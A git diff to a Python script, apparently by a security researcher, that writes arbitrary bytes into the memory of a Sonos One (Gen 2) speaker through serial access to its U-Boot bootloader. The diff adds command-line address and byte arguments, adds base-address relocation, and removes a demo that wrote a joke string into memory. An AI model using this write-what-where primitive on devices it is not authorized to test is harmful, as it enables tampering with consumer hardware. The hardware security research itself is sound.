@@ -1,3 +1,19 @@
+'''
+This write-what-where script allows for writing to arbitrary memory locations
+on a Sonos One (Generation 2) [S18] device, though it may be compatible with
+others.
+
+### NOTE ###
+
+Addresses will be automatically shifted to the `relocaddr` if provided with a
+memory address which is less than the defined `relocaddr`. This allows for
+translation between the addresses from a disassembler and as loaded in memory
+on the unit just to speed things up. However, this may differ from product to
+product, so may need adjustment.
+
+Author: Peter Adkins (@Darkarnium)
+'''
+
 import sys
 import serial
 import datetime
@@ -57,6 +73,7 @@ def unit_to_uboot():
             # Dump the buffer contents if no matches.
             buffer = bytes()
 
+
 def write_to_memory(value, addr, device=0x30, register=0x70):
     '''
     Attempt to write the given value (byte) into memory at the given address.
@@ -108,12 +125,22 @@ def write_to_memory(value, addr, device=0x30, register=0x70):
 
 
 if __name__ == '__main__':
-    unit_to_uboot()
-    base = 0x3ff21000
-    crosstool = base + 0x5CA23
-    replace = "Oh god how did this get here I am not good with computer. Send help D: "
+    if len(sys.argv) < 2:
+        print('Usage: write-what-where.py <address> <byte>')
+        sys.exit(-1)
 
-    c_addr = crosstool
-    for char in replace:
-        write_to_memory(ord(char), c_addr)
-        c_addr += 1
+    # Attempt to dump memory.
+    load = 0x01000000
+    base = 0x3ff21000
+    addr = int(sys.argv[1], 16)
+    byte = int(sys.argv[2], 16)
+
+    # Fix the base addresses, if required.
+    if addr < base:
+        print('[-] Fixing base address for 0x{0:0x}'.format(addr))
+        addr = base + (addr - load)
+
+    # Reset to a clean state first.
+    unit_to_uboot()
+    print('[+] Patching 0x{0:0x} with byte 0x{0:0x}'.format(addr, byte))
+    write_to_memory(byte, addr)
